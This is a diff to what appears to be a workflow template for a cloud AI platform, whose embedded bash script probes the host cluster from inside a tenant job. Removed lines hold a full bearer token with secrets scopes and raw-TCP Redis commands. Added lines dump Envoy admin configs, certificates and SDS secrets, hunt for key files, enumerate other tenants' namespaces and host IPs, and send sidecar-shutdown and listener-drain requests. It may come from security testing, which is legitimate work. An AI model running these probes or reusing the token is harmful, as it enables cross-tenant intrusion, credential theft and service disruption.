@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "18.0.0"
+    ai.sap.com/version: "19.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,88 +24,137 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V18 ML-TRACKING + REDIS PROBE ==="
+        echo "=== V19 DEEP PROBE ==="
         
-        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
-        JWT="eyJ0eXAiOiJKV1QiLCJqaWQiOiJLakRWeGNCbGZGTEVNc1dsRDdXMmVYaVZvWTNJTTdkbjVmODJvY1VDSXNFPSIsImFsZyI6IlJT...T8e2XAZ8wqNkZOn-vW6g"
-        FULL_JWT="eyJ0eXAiOiJKV1QiLCJqaWQiOiJLakRWeGNCbGZGTEVNc1dsRDdXMmVYaVZvWTNJTTdkbjVmODJvY1VDSXNFPSIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9jZi1haWNvcmUtc2VjdXJpdHktYmItMTQuYXV0aGVudGljYXRpb24uZXUxMC5oYW5hLm9uZGVtYW5kLmNvbS90b2tlbl9rZXlzIiwia2lkIjoiZGVmYXVsdC1qd3Qta2V5LTdjY2ZkMmVjNzgifQ.eyJzdWIiOiJzYi1haWNvcmUtYmItMTQhYjYyNzU1NHxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJpc3MiOiJodHRwczovL2NmLWFpY29yZS1zZWN1cml0eS1iYi0xNC5hdXRoZW50aWNhdGlvbi5ldTEwLmhhbmEub25kZW1hbmQuY29tL29hdXRoL3Rva2VuIiwiYXV0aG9yaXRpZXMiOlsiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VydmljZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRlcGxveW1lbnRzLmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZG9ja2VycmVnaXN0cnlzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV2YWx1YXRpb25NZXRyaWNzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMuZG93bmxvYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLnByb21wdFRlbXBsYXRlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuY3JlYXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMucmVhZCIsInVhYS5yZXNvdXJjZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZWNyZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5kZXBsb3ltZW50cy5wcmVkaWN0IiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuZGVsZXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5jb25maWd1cmF0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5rcGlzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLndyaXRlIl0sImNsaWVudF9pZCI6InNiLWFpY29yZS1iYi0xNCFiNjI3NTU0fGFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NCIsImF1ZCI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kZXBsb3ltZW50cy5sb2dzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMiLCJ1YWEiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXBvc2l0b3JpZXMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEiLCJzYi1haWNvcmUtYmItMTQhYjYyNzU1NHxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2RlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYmF0Y2hlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5vYmplY3RzdG9yZXNlY3JldC5jcmVkZW50aWFscyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQua3BpcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYXJ0aWZhY3RzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMiXSwiZXh0X2F0dHIiOnsiZW5oYW5jZXIiOiJYU1VBQSIsInN1YmFjY291bnRpZCI6IjQ2NDQ5MDEzLTAzYjMtNGE2MC04YzJjLTVlOThmZDMwMzQ5OCIsInpkbiI6ImNmLWFpY29yZS1zZWN1cml0eS1iYi0xNCIsInNlcnZpY2VpbnN0YW5jZWlkIjoiYWljb3JlLWJiLTE0In0sInppZCI6IjQ2NDQ5MDEzLTAzYjMtNGE2MC04YzJjLTVlOThmZDMwMzQ5OCIsImdyYW50X3R5cGUiOiJjbGllbnRfY3JlZGVudGlhbHMiLCJhenAiOiJzYi1haWNvcmUtYmItMTQhYjYyNzU1NHxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJzY29wZSI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGFibGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuYXBwbGljYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGVwbG95bWVudHMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZXhlY3V0aW9ucy5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kYXRhc2V0cy5kb3dubG9hZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5jcmVhdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVzb3VyY2Vncm91cC53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cy5yZWFkIiwidWFhLnJlc291cmNlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuY29uZmlndXJhdGlvbnMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnByZWRpY3QiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubWV0YS5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5kZWxldGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmtwaXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3Mub3JjaGVzdHJhdGlvbkNvbmZpZ3Mud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMud3JpdGUiXSwiZXhwIjoxNzczNDczNTA4LCJpYXQiOjE3NzM0MzAzMDgsImp0aSI6Ijg1NjdkYWQxZTA1OTQxZDBiNmJiOTExYzliZTEwMjRhIiwicmV2X3NpZyI6IjQ5Njc1NzBkIiwiY2lkIjoic2ItYWljb3JlLWJiLTE0IWI2Mjc1NTR8YWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0In0.nIOksUsdmF4S6tdryve0na67gkTLbDJmEhvSC1h4Kf5qXWIMsTqhadRsTjUe-d1fiyrCAVKKDPTGBkX-9DUeHdQu9fMzdvmoeEPoX92iokn9rBBNpj34HtPnr9mNB3YVsbi8kDE88N6FS_wo7_7KLgKCcefkhjQcTx4aMRHPfrOubQe6hHuCnLxB6QHPN4yVh5ro0i52MlYeejdb732NtygvMIDA-HU2y0VCHpvzM4dBq1leh4cNRPH_q8EtpiSVQVOQ_qEZPI21HNr687JC-z0Dk1zR9tkmfC7QudbGYnafjG1eTscMtGSuCOdGgiAQSlT8e2XAZ8wqNkZOn-vW6g"
+        # === ENVOY SIDECAR ADMIN (localhost:15000) ===
+        echo "=== ENVOY ADMIN ==="
         
-        # === ML TRACKING WITH REAL JWT ===
-        echo "=== ML-TRACKING WITH REAL JWT ==="
-        echo "--- Root ---"
-        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo "--- /server_info ---"
+        curl -s --connect-timeout 3 "http://localhost:15000/server_info" 2>&1 | head -c 1000
         echo ""
         
-        echo "--- /api/v1/metrics ---"
-        curl -s --connect-timeout 5 "$TRACK/api/v1/metrics" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo "--- /clusters (service mesh topology) ---"
+        CLUSTERS=$(curl -s --connect-timeout 3 "http://localhost:15000/clusters" 2>&1)
+        echo "$CLUSTERS" | head -c 3000
+        echo ""
+        echo "CLUSTER_BYTES=$(echo "$CLUSTERS" | wc -c)"
+        # Extract unique service names
+        echo "UNIQUE_SERVICES:"
+        echo "$CLUSTERS" | grep -E "^[a-z]" | head -50
         echo ""
         
-        echo "--- /api/v1/experiments ---"
-        curl -s --connect-timeout 5 "$TRACK/api/v1/experiments" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo "--- /config_dump (full envoy config) ---"
+        CONFIG=$(curl -s --connect-timeout 5 "http://localhost:15000/config_dump" 2>&1)
+        echo "CONFIG_BYTES=$(echo "$CONFIG" | wc -c)"
+        # Look for secrets/certs in config
+        echo "$CONFIG" | grep -i -E "(secret|cert|key|password|token)" | head -20
         echo ""
         
-        echo "--- /api/v1/runs ---"
-        curl -s --connect-timeout 5 "$TRACK/api/v1/runs" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo "--- /listeners ---"
+        curl -s --connect-timeout 3 "http://localhost:15000/listeners" 2>&1 | head -c 2000
         echo ""
         
-        echo "--- /api/v1/info ---"
-        curl -s --connect-timeout 5 "$TRACK/api/v1/info" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo "--- /certs ---"
+        curl -s --connect-timeout 3 "http://localhost:15000/certs" 2>&1 | head -c 3000
         echo ""
         
-        # Also try with different resource groups
-        echo "--- Different RG header ---"
-        curl -s --connect-timeout 5 "$TRACK/api/v1/metrics" \
-          -H "Authorization: Bearer $FULL_JWT" \
-          -H "AI-Resource-Group: default" 2>&1 | head -c 500
+        echo "--- /stats (look for upstream connections) ---"
+        curl -s --connect-timeout 3 "http://localhost:15000/stats" 2>&1 | grep -E "(upstream_cx|membership)" | head -30
         echo ""
         
-        # === REDIS PROBES ===
-        echo "=== REDIS PROBES ==="
+        # === ISTIO CERTIFICATE EXTRACTION ===
+        echo "=== ISTIO CERTS ==="
         
-        for REDIS_HOST in "100.107.100.17" "100.109.69.212"; do
-          echo "--- Redis $REDIS_HOST ---"
-          
-          # Try direct TCP (bypass Istio if possible)
-          echo "TCP PING:"
-          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'PING\r' >&3 && sleep 1 && cat <&3 && exec 3>&-" 2>&1
-          echo ""
-          
-          echo "TCP INFO:"
-          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'INFO\r' >&3 && sleep 2 && head -c 1000 <&3 && exec 3>&-" 2>&1
-          echo ""
-          
-          echo "TCP KEYS:"
-          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'KEYS *\r' >&3 && sleep 2 && head -c 1000 <&3 && exec 3>&-" 2>&1
-          echo ""
+        # Check for Istio cert mount paths
+        echo "--- Cert file search ---"
+        find / -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "cert-chain*" -o -name "root-cert*" 2>/dev/null | head -20
+        echo ""
+        
+        # Standard Istio cert locations
+        for certpath in           "/var/run/secrets/istio"           "/var/run/secrets/istio/root-cert.pem"           "/var/run/secrets/istio/cert-chain.pem"           "/var/run/secrets/istio/key.pem"           "/etc/certs"           "/etc/istio/proxy"           "/var/run/secrets/tokens"           "/var/run/secrets/credentials"; do
+          if [ -e "$certpath" ]; then
+            echo "FOUND: $certpath"
+            ls -la "$certpath" 2>/dev/null
+            if [ -f "$certpath" ]; then
+              head -c 500 "$certpath"
+              echo ""
+            fi
+          fi
         done
         
-        # Try redis-cli if available
-        which redis-cli 2>/dev/null && {
-          for REDIS_HOST in "100.107.100.17" "100.109.69.212"; do
-            echo "redis-cli $REDIS_HOST:"
-            redis-cli -h $REDIS_HOST PING 2>&1 | head -c 200
-            redis-cli -h $REDIS_HOST INFO server 2>&1 | head -c 500
-            echo ""
-          done
-        } || echo "No redis-cli available"
-        
-        # === KSM FULL DUMP (pods - cross tenant data) ===
-        echo "=== KSM PODS SAMPLE ==="
-        curl -s --connect-timeout 5 "http://100.106.241.163:8080/metrics" 2>&1 | grep -E "^kube_pod_info" | head -30
+        # Check /proc for cert data in sidecar process
+        echo "--- Process list ---"
+        ps aux 2>/dev/null | head -20
         echo ""
         
-        # Count unique namespaces from KSM
-        echo "=== NAMESPACE COUNT ==="
-        curl -s --connect-timeout 5 "http://100.106.241.163:8080/metrics" 2>&1 | grep -oP 'namespace="[^"]+"' | sort -u
+        # Try to extract SDS (Secret Discovery Service) certs via Envoy
+        echo "--- Envoy SDS secrets ---"
+        curl -s --connect-timeout 3 "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1 | head -c 3000
         echo ""
         
-        # === OTEL COLLECTOR ===
-        echo "=== OTEL COLLECTOR ==="
-        curl -s --connect-timeout 5 "http://100.109.242.36:55679/debug/tracez" 2>&1 | head -c 500
+        # Try Istio debug endpoints
+        echo "--- Istio pilot-agent ---"
+        curl -s --connect-timeout 3 "http://localhost:15020/healthz/ready" 2>&1 | head -c 200
         echo ""
-        curl -s --connect-timeout 5 "http://100.109.242.36:55679/debug/servicez" 2>&1 | head -c 500
+        curl -s --connect-timeout 3 "http://localhost:15020/debug/ndsz" 2>&1 | head -c 500
         echo ""
-        curl -s --connect-timeout 5 "http://100.109.242.36:8888/metrics" 2>&1 | head -c 500
+        curl -s --connect-timeout 3 "http://localhost:15020/debug/endpointz" 2>&1 | head -c 1000
+        echo ""
+        curl -s --connect-timeout 3 "http://localhost:15020/quitquitquit" 2>&1 | head -c 200
         echo ""
         
-        echo "=== V18 COMPLETE ==="
+        # === ENVOY CONFIG MODIFICATION (test if writable) ===
+        echo "=== ENVOY MODIFY TEST ==="
+        # Try to add a new route via admin API
+        echo "--- POST /logging?level=debug ---"
+        curl -s -X POST --connect-timeout 3 "http://localhost:15000/logging?level=debug" 2>&1 | head -c 500
+        echo ""
+        
+        # Try to drain listeners (DoS test - just checking if writable)
+        echo "--- POST /drain_listeners (check only) ---"
+        curl -s -X POST --connect-timeout 3 "http://localhost:15000/drain_listeners?graceful" 2>&1 | head -c 200
+        echo ""
+        
+        # === KSM DEEP ANALYSIS ===
+        echo "=== KSM DEEP ==="
+        
+        # Get full KSM pods dump and extract key data
+        KSM_DATA=$(curl -s --connect-timeout 10 "http://100.106.241.163:8080/metrics" 2>&1)
+        echo "KSM_TOTAL_BYTES=$(echo "$KSM_DATA" | wc -c)"
+        
+        # Extract unique namespaces
+        echo "NAMESPACES:"
+        echo "$KSM_DATA" | grep -oE 'namespace="[^"]+"' | sort -u
+        echo ""
+        
+        # Count pods per namespace
+        echo "PODS_PER_NS:"
+        echo "$KSM_DATA" | grep "^kube_pod_info" | grep -oE 'namespace="[^"]+"' | sort | uniq -c | sort -rn
+        echo ""
+        
+        # Look for secrets references
+        echo "SECRET_REFS:"
+        echo "$KSM_DATA" | grep -i "secret" | head -20
+        echo ""
+        
+        # Look for container images (reveal tech stack)
+        echo "CONTAINER_IMAGES:"
+        echo "$KSM_DATA" | grep -oE 'image="[^"]+"' | sort -u | head -30
+        echo ""
+        
+        # Look for resource group namespaces (other tenants)
+        echo "TENANT_NAMESPACES:"
+        echo "$KSM_DATA" | grep -oE 'namespace="rg-[^"]+"' | sort -u
+        echo ""
+        
+        # Extract host IPs (node info)
+        echo "HOST_IPS:"
+        echo "$KSM_DATA" | grep -oE 'host_ip="[^"]+"' | sort -u
+        echo ""
+        
+        # Extract priority classes (security context hints)
+        echo "PRIORITY_CLASSES:"
+        echo "$KSM_DATA" | grep -oE 'priority_class="[^"]+"' | sort -u
+        echo ""
+        
+        echo "=== V19 COMPLETE ==="
